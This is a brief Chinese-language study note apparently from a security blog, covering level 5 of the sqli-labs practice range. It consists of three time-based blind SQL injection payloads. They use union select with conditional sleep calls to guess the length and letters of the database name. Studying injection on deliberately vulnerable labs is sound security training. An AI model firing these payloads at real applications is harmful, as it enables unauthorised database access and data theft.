---
title: "网安笔记 - 靶场实例 - sql注入 - sqlilabs - sqlilabs-less05"
category: "网安笔记"
date: 2026-04-07
published: 2026-04-07
author: "Rin"
---

### payload

-1' union select 1,if(length(database())=8,sleep(5),sleep(0)),3--+ //爆字段长度

-1' union select 1,if(substring(database(),1,1)='s',sleep(5),sleep(0)),3--+ //爆数据库第一个字母
-1' union select 1,if(substring(database(),1,8)='security',sleep(5),sleep(0)),3--+ //猜数据库名